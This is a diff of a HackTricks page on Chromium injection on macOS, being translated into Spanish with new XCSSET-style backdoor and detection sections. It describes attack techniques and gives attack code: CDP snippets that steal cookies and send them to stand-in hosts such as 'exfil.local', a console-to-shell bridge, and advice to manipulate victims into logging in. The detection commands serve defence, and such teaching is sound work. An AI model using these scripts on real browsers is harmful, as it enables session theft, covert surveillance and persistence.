@@ -1,39 +1,48 @@
-# macOS Chromium Injection
+# Chromium Injection en macOS
 
 {{#include ../../../banners/hacktricks-training.md}}
 
 ## Información básica
 
-Chromium-based browsers like Google Chrome, Microsoft Edge, Brave, Arc, Vivaldi, and Opera all consume the same command-line switches, preference files, and DevTools automation interfaces. On macOS, any user with GUI access can terminate an existing browser session and re-open it with arbitrary flags, extensions, or DevTools endpoints that run with the target's entitlements.
+Los navegadores basados en Chromium, como Google Chrome, Microsoft Edge, Brave, Arc, Vivaldi y Opera, utilizan los mismos command-line switches, archivos de preferencias e interfaces de automatización de DevTools. En macOS, cualquier usuario con acceso a la GUI puede terminar una sesión existente del navegador y volver a abrirla con flags arbitrarios, extensiones o endpoints de DevTools que se ejecutan con los entitlements del objetivo.
 
-#### Launching Chromium with custom flags on macOS
+#### Iniciar Chromium con flags personalizados en macOS
 
-macOS keeps a single UI instance per Chromium profile, so instrumentation normally requires force-closing the browser (for example with `osascript -e 'tell application "Google Chrome" to quit'`). Attackers typically relaunch via `open -na "Google Chrome" --args <flags>` so they can inject arguments without modifying the app bundle. Wrapping that command inside a user LaunchAgent (`~/Library/LaunchAgents/*.plist`) or login hook guarantees the tampered browser is respawned after reboot/logoff.
+macOS mantiene una única instancia de UI por perfil de Chromium, por lo que la instrumentación normalmente requiere cerrar el navegador por la fuerza (por ejemplo, con `osascript -e 'tell application "Google Chrome" to quit'`). Los atacantes suelen volver a iniciarlo mediante `open -na "Google Chrome" --args <flags>` para poder inyectar argumentos sin modificar el app bundle. Envolver ese comando en un LaunchAgent del usuario (`~/Library/LaunchAgents/*.plist`) o en un login hook garantiza que el navegador manipulado se reinicie después de un reinicio o cierre de sesión.
 
-#### `--load-extension` Flag
+#### Flag `--load-extension`
 
-The `--load-extension` flag auto-loads unpacked extensions (comma-separated paths). Pair it with `--disable-extensions-except` to block legitimate extensions while forcing only your payload to run. Malicious extensions can request high-impact permissions such as `debugger`, `webRequest`, and `cookies` to pivot into DevTools protocols, patch CSP headers, downgrade HTTPS, or exfiltrate session material as soon as the browser starts.
+El flag `--load-extension` carga automáticamente extensiones unpacked (rutas separadas por comas). Combínalo con `--disable-extensions-except` para bloquear las extensiones legítimas y forzar la ejecución únicamente de tu payload. Las extensiones maliciosas pueden solicitar permisos de alto impacto, como `debugger`, `webRequest` y `cookies`, para pivotar hacia protocolos de DevTools, modificar headers CSP, degradar HTTPS o exfiltrar material de sesión en cuanto se inicia el navegador.
 
-#### `--remote-debugging-port` / `--remote-debugging-pipe` Flags
+#### Flags `--remote-debugging-port` / `--remote-debugging-pipe`
 
-These switches expose the Chrome DevTools Protocol (CDP) over TCP or a pipe so external tooling can drive the browser. Google observed widespread infostealer abuse of this interface and, beginning with Chrome 136 (March 2025), the switches are ignored for the default profile unless the browser is launched with a non-standard `--user-data-dir`. This enforces App-Bound Encryption on real profiles, but attackers can still spawn a fresh profile, coerce the victim to authenticate inside it (phishing/triage assistance), and harvest cookies, tokens, device trust states, or WebAuthn registrations via CDP.
+Estos switches exponen el Chrome DevTools Protocol (CDP) mediante TCP o un pipe, permitiendo que herramientas externas controlen el navegador. Google observó un abuso generalizado de esta interfaz por parte de infostealers y, desde Chrome 136 (marzo de 2025), los switches se ignoran para el perfil predeterminado, salvo que el navegador se inicie con un `--user-data-dir` no estándar. Esto aplica App-Bound Encryption a los perfiles reales, pero los atacantes aún pueden iniciar un perfil nuevo, inducir a la víctima a autenticarse dentro de él (phishing/triage assistance) y obtener cookies, tokens, estados de confianza del dispositivo o registros de WebAuthn mediante CDP.
 
-#### `--user-data-dir` Flag
+#### Flag `--user-data-dir`
 
-This flag redirects the entire browser profile (History, Cookies, Login Data, Preference files, etc.) to an attacker-controlled path. It is mandatory when combining modern Chrome builds with `--remote-debugging-port`, and it also keeps the tampered profile isolated so you can drop pre-populated `Preferences` or `Secure Preferences` files that disable security prompts, auto-install extensions, and change default schemes.
+Este flag redirige el perfil completo del navegador (History, Cookies, Login Data, archivos de preferencias, etc.) a una ruta controlada por el atacante. Es obligatorio al combinar builds modernos de Chrome con `--remote-debugging-port` y también mantiene aislado el perfil manipulado, de modo que puedes colocar archivos `Preferences` o `Secure Preferences` preconfigurados que deshabiliten security prompts, instalen extensiones automáticamente y cambien los esquemas predeterminados.
 
-#### `--use-fake-ui-for-media-stream` Flag
+#### Flag `--use-fake-ui-for-media-stream`
 
-This switch bypasses the camera/mic permission prompt so any page that calls `getUserMedia` receives access immediately. Combine it with flags such as `--auto-select-desktop-capture-source="Entire Screen"`, `--kiosk`, or CDP `Browser.grantPermissions` commands to silently capture audio/video, desk-share, or satisfy WebRTC permission checks without user interaction.
+Este switch evita el permission prompt de la cámara y el micrófono, por lo que cualquier página que llame a `getUserMedia` obtiene acceso inmediatamente. Combínalo con flags como `--auto-select-desktop-capture-source="Entire Screen"`, `--kiosk` o comandos CDP `Browser.grantPermissions` para capturar audio/vídeo silenciosamente, compartir el escritorio o satisfacer las comprobaciones de permisos de WebRTC sin interacción del usuario.
 
-## Remote Debugging & DevTools Protocol Abuse
+## Patrones de Delivery y Relaunch observados en la práctica
 
-Once Chrome is relaunched with a dedicated `--user-data-dir` and `--remote-debugging-port`, you can attach over CDP (e.g., via `chrome-remote-interface`, `puppeteer`, or `playwright`) and script high-privilege workflows:
+El abuso de CDP suele ser una fase de **post-exploitation**, en lugar del payload inicial. Una campaña reciente de macOS dirigida a developers utilizó una fase de build **`Run Script`** de Xcode envenenada (`PBXShellScriptBuildPhase`), de modo que el código solo se ejecutaba cuando la víctima **compilaba** el proyecto, no cuando simplemente lo clonaba o abría. Después de esa primera ejecución, el malware también infectaba otros árboles `.xcodeproj`, añadía hooks maliciosos de Git `pre-commit` y buscaba más proyectos de Xcode en archivos ZIP.
 
-- **Robo de cookies/sesiones:** `Network.getAllCookies` and `Storage.getCookies` return HttpOnly values even when App-Bound encryption would normally block filesystem access, because CDP asks the running browser to decrypt them.
-- **Manipulación de permisos:** `Browser.grantPermissions` and `Emulation.setGeolocationOverride` let you bypass camera/mic prompts (especially when combined with `--use-fake-ui-for-media-stream`) or falsify location-based security checks.
-- **Inyección de pulsaciones/scripts:** `Runtime.evaluate` ejecuta JavaScript arbitrario dentro de la pestaña activa, permitiendo obtener credenciales, parchear el DOM o inyectar beacons de persistencia que sobreviven a la navegación.
-- **Exfiltración en vivo:** `Network.webRequestWillBeSentExtraInfo` y `Fetch.enable` interceptan requests/responses autenticadas en tiempo real sin tocar artefactos en disco.
+En el caso del abuso de Chromium, esto es importante porque el atacante no necesita modificar el browser binary. En su lugar, un stager de corta duración en la build phase / `osascript` puede instalar un **browser wrapper** (LaunchAgent, login item, entrada del Dock, app launcher troyanizado, etc.) que vuelve a abrir el navegador legítimo con flags controlados por el atacante cada vez que el usuario lo inicia.
+
+> [!TIP]
+> En endpoints de developers, inspecciona los archivos `.pbxproj`, `.git/hooks/pre-commit` y los ZIP que contengan `.xcodeproj` en busca de `curl`, `osascript`, `xxd`, `base64` anidado o lógica inesperada para volver a iniciar Chrome.
+
+## Remote Debugging y abuso del DevTools Protocol
+
+Una vez que Chrome se vuelve a iniciar con un `--user-data-dir` dedicado y `--remote-debugging-port`, puedes conectarte mediante CDP (por ejemplo, con `chrome-remote-interface`, `puppeteer` o `playwright`) y automatizar workflows de altos privilegios:
+
+- **Robo de cookies/sesiones:** `Network.getAllCookies` y `Storage.getCookies` devuelven valores HttpOnly incluso cuando App-Bound encryption normalmente impediría el acceso al filesystem, porque CDP solicita al navegador en ejecución que los descifre.
+- **Manipulación de permisos:** `Browser.grantPermissions` y `Emulation.setGeolocationOverride` permiten omitir los prompts de permisos de cámara/micrófono (especialmente combinados con `--use-fake-ui-for-media-stream`) o falsificar comprobaciones de seguridad basadas en la ubicación.
+- **Inyección de keystrokes/scripts:** `Runtime.evaluate` ejecuta JavaScript arbitrario dentro de la pestaña activa, permitiendo extraer credenciales, modificar el DOM o inyectar beacons de persistencia que sobrevivan a la navegación.
+- **Exfiltración en vivo:** `Network.webRequestWillBeSentExtraInfo` y `Fetch.enable` interceptan requests/responses autenticados en tiempo real sin tocar artefactos del disco.
 ```javascript
 import CDP from 'chrome-remote-interface';
 
@@ -47,17 +56,42 @@ await Runtime.evaluate({expression: "fetch('https://xfil.local', {method:'POST',
 await client.close();
 })();
 ```
-Porque Chrome 136 bloquea CDP en el perfil predeterminado, copiar/pegar el directorio existente `~/Library/Application Support/Google/Chrome` de la víctima a una ruta de staging ya no proporciona cookies descifradas. En su lugar, social-engineer al usuario para que se autentique dentro del perfil instrumentado (p. ej., una sesión de soporte "helpful") o captura tokens MFA en tránsito mediante hooks de red controlados por CDP.
+Dado que Chrome 136 bloquea CDP en el perfil predeterminado, copiar el directorio existente `~/Library/Application Support/Google/Chrome` de la víctima a una ruta de staging ya no permite obtener cookies descifradas. En su lugar, aplica ingeniería social al usuario para que se autentique dentro del perfil instrumentado (por ejemplo, mediante una sesión de soporte "útil") o captura tokens MFA en tránsito mediante network hooks controlados por CDP.
 
-## Extension-Based Injection via Debugger API
+### XCSSET-style CDP Backdoor Chain
 
-La investigación de 2023 "Chrowned by an Extension" demostró que una extensión maliciosa que usa la API `chrome.debugger` puede adjuntarse a cualquier pestaña y obtener los mismos poderes de DevTools que `--remote-debugging-port`. Eso rompe las suposiciones originales de aislamiento (las extensiones permanecen en su contexto) y permite:
+Un patrón práctico de malware consiste en:
 
-- Robo silencioso de cookies y credenciales con `Network.getAllCookies`/`Fetch.getResponseBody`.
-- Modificación de permisos de sitio (camera, microphone, geolocation) y bypass de intersticiales de seguridad, permitiendo que páginas de phishing suplanten diálogos de Chrome.
-- Manipulación on-path de advertencias TLS, descargas o prompts de WebAuthn conduciendo programáticamente `Page.handleJavaScriptDialog`, `Page.setDownloadBehavior`, o `Security.handleCertificateError`.
+1. Reiniciar el implant o wrapper en userland cada vez que se inicia Chrome.
+2. Iniciar el navegador legítimo con `--remote-debugging-port=<port>` y, en Chrome 136+, normalmente con un `--user-data-dir=<dir>` no predeterminado.
+3. Iniciar un helper que se conecte al WebSocket CDP local y registre un pre-document hook con `Page.addScriptToEvaluateOnNewDocument`.
 
-Carga la extensión con `--load-extension`/`--disable-extensions-except` para que no se requiera interacción del usuario. Un background script mínimo que hace uso malicioso de la API se ve así:
+Ese helper puede inyectar JavaScript **antes** de que se ejecute el código del sitio, lo que resulta ideal para aplicar hooks a `window.fetch`, `XMLHttpRequest`, wallet providers o flujos de autofill sin modificar archivos en disco.
+```javascript
+await Page.enable();
+await Runtime.enable();
+await Page.addScriptToEvaluateOnNewDocument({
+source: `
+const oldFetch = window.fetch;
+window.fetch = async (...args) => {
+console.log('__HT__' + JSON.stringify(args[0]));
+return oldFetch(...args);
+};
+`
+});
+Runtime.consoleAPICalled(({args}) => { /* helper parses __HT__ */ });
+```
+Una variante más potente convierte el navegador en un **puente de comandos del host**: el JavaScript inyectado emite un `console.log` con una etiqueta delimitadora, el helper local supervisa `Runtime.consoleAPICalled`, elimina el marcador, ejecuta el resto mediante el shell del host (por ejemplo, `exec.Command` de Go) y devuelve stdout/stderr a través del WebSocket del atacante. Esto transforma la ejecución de scripts a nivel de pestaña en una reverse shell mayormente fileless.
+
+## Inyección basada en extensiones mediante la API de Debugger
+
+La investigación de 2023, "Chrowned by an Extension", demostró que una extensión maliciosa que utiliza la API `chrome.debugger` puede conectarse a cualquier pestaña y obtener los mismos poderes de DevTools que `--remote-debugging-port`. Esto rompe las suposiciones originales de aislamiento (las extensiones permanecen en su propio contexto) y permite:
+
+- Robo silencioso de cookies y credenciales mediante `Network.getAllCookies`/`Fetch.getResponseBody`.
+- Modificación de permisos de sitios (cámara, micrófono y geolocalización) y bypass de intersticiales de seguridad, permitiendo que las páginas de phishing suplanten los diálogos de Chrome.
+- Manipulación on-path de advertencias TLS, descargas o avisos de WebAuthn controlando mediante programación `Page.handleJavaScriptDialog`, `Page.setDownloadBehavior` o `Security.handleCertificateError`.
+
+Carga la extensión con `--load-extension`/`--disable-extensions-except` para que no sea necesaria ninguna interacción del usuario. Un script de background mínimo que weaponiza la API tiene este aspecto:
 ```javascript
 chrome.tabs.onUpdated.addListener((tabId, info) => {
 if (info.status !== 'complete') return;
@@ -69,13 +103,25 @@ fetch('https://exfil.local/dump', {method: 'POST', body: JSON.stringify(res.cook
 });
 });
 ```
-La extensión también puede suscribirse a eventos `Debugger.paused` para leer variables de JavaScript, parchear inline scripts o colocar breakpoints personalizados que sobreviven a la navegación. Como todo se ejecuta dentro de la sesión GUI del usuario, Gatekeeper y TCC no se activan, lo que hace que esta técnica sea ideal para malware que ya logró ejecución en el contexto del usuario.
+La extensión también puede suscribirse a eventos `Debugger.paused` para leer variables de JavaScript, modificar scripts inline o colocar breakpoints personalizados que sobrevivan a la navegación. Como todo se ejecuta dentro de la sesión GUI del usuario, Gatekeeper y TCC no se activan, lo que hace que esta técnica sea ideal para malware que ya logró ejecutarse bajo el contexto del usuario.
 
+## Detección y búsqueda
+
+- Genera una alerta cuando los navegadores Chromium se inicien con `--remote-debugging-port`, `--remote-debugging-pipe` o un `--user-data-dir` sospechoso, especialmente cuando el proceso padre sea `bash`, `sh`, `osascript`, `xcodebuild` o un helper de LaunchAgent.
+- Busca cadenas cortas en las que un helper abra un WebSocket CDP local, registre `Page.addScriptToEvaluateOnNewDocument` y después establezca una conexión WebSocket/HTTPS saliente de larga duración.
+- Busca puentes de console-to-shell correlacionando la actividad de `Runtime.consoleAPICalled` del navegador con shells secundarios o procesos helper que ejecuten comandos proporcionados por el atacante.
+- En Macs de desarrolladores, revisa las entradas `PBXShellScriptBuildPhase` de `.pbxproj`, los hooks `pre-commit` de Git, los relanzadores del Dock/elementos de inicio de sesión y los proyectos de Xcode contenidos en ZIP en busca de la instalación de wrappers del navegador.
+```bash
+ps auxww | rg 'Chrome|Brave|Edge.*(--remote-debugging-port|--remote-debugging-pipe|--user-data-dir)'
+lsof -nP -iTCP -sTCP:LISTEN | rg 'Chrome|Brave|Edge'
+find ~/Library/LaunchAgents /Library/LaunchAgents -name '*.plist' -exec plutil -p {} \; 2>/dev/null | rg 'remote-debugging|Google Chrome|Brave|Edge'
+rg -n 'PBXShellScriptBuildPhase|curl|osascript|xxd|base64' ~/Code --glob '*.pbxproj'
+```
 ### Herramientas
 
-- [https://github.com/breakpointHQ/snoop](https://github.com/breakpointHQ/snoop) - Automatiza los lanzamientos de Chromium con extensiones de payload y expone hooks interactivos de CDP.
-- [https://github.com/breakpointHQ/VOODOO](https://github.com/breakpointHQ/VOODOO) - Herramientas similares enfocadas en la intercepción de tráfico e instrumentación del navegador para operadores de macOS.
-- [https://github.com/cyrus-and/chrome-remote-interface](https://github.com/cyrus-and/chrome-remote-interface) - Biblioteca de Node.js para automatizar dumps del Chrome DevTools Protocol (cookies, DOM, permissions) una vez que una instancia `--remote-debugging-port` esté activa.
+- [https://github.com/breakpointHQ/snoop](https://github.com/breakpointHQ/snoop) - Automatiza el lanzamiento de Chromium con extensiones de payload y expone hooks interactivos de CDP.
+- [https://github.com/breakpointHQ/VOODOO](https://github.com/breakpointHQ/VOODOO) - Herramienta similar centrada en la interceptación de tráfico y la instrumentación del navegador para operadores de macOS.
+- [https://github.com/cyrus-and/chrome-remote-interface](https://github.com/cyrus-and/chrome-remote-interface) - Librería de Node.js para crear scripts que obtengan datos del Chrome DevTools Protocol (cookies, DOM, permisos) una vez que haya una instancia activa con `--remote-debugging-port`.
 
 ### Ejemplo
 ```bash
@@ -92,10 +138,13 @@ open -na "Google Chrome" --args \
 # Intercept traffic
 voodoo intercept -b chrome
 ```
-Encuentra más ejemplos en los enlaces de las herramientas.
+Encuentra más ejemplos en los enlaces de tools.
 
 ## Referencias
 
+- [https://chromedevtools.github.io/devtools-protocol/v8/Runtime/](https://chromedevtools.github.io/devtools-protocol/v8/Runtime/)
+- [https://chromedevtools.github.io/devtools-protocol/tot/Page/](https://chromedevtools.github.io/devtools-protocol/tot/Page/)
+- [https://unit42.paloaltonetworks.com/xcsset-v40-malware-analysis/](https://unit42.paloaltonetworks.com/xcsset-v40-malware-analysis/)
 - [https://twitter.com/RonMasas/status/1758106347222995007](https://twitter.com/RonMasas/status/1758106347222995007)
 - [https://developer.chrome.com/blog/remote-debugging-port](https://developer.chrome.com/blog/remote-debugging-port)
 - [https://arxiv.org/abs/2305.11506](https://arxiv.org/abs/2305.11506)
